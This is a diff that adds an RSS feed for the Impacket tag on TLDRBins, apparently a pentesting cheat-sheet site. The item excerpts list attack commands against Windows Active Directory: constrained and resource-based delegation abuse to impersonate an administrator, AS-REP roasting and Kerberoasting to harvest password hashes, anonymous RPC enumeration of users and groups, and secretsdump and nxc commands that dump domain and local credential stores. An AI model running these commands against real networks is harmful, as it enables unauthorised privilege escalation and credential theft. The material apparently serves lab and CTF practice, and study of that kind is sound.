@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Impacket on TLDRBins</title>
+    <link>https://tldrbins.github.io/@impacket/</link>
+    <description>Recent content in Impacket on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@impacket/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Constrained Delegation</title>
+      <link>https://tldrbins.github.io/constrained_delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
+      <description>Abuse #1: RBCD Attack 1. Find delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 2. RBCD # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USERNAME&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k # Impersonate impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate &amp;lt;TARGET_2&amp;gt; # Check forwardable flag describeTicket.</description>
+    </item>
+    <item>
+      <title>Kerberoasting</title>
+      <link>https://tldrbins.github.io/roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/roasting/</guid>
+      <description>AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile usernames.txt -no-pass -dc-ip &amp;lt;DC&amp;gt; # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; Kerberoasting From Linux # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -no-preauth &amp;lt;USER_WITH_DONT_REQUIRE_PREAUTH&amp;gt; -usersfile usernames.</description>
+    </item>
+    <item>
+      <title>RPC</title>
+      <link>https://tldrbins.github.io/rpc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rpc/</guid>
+      <description> rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 # Inline execute command rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup &amp;lt;RID&amp;gt; # Query group member by rid querygroupmem &amp;lt;RID&amp;gt; # Query user by rid queryuser &amp;lt;RID&amp;gt; # Look up a user lookupnames &amp;lt;USER&amp;gt; # Look up by SID lookupsids &amp;lt;SID&amp;gt; impacket-lookupsid impacket-lookupsid &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
+    </item>
+    <item>
+      <title>secretsdump</title>
+      <link>https://tldrbins.github.io/secretsdump/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/secretsdump/</guid>
+      <description> With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; nxc nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
+    </item>
+  </channel>
+</rss>
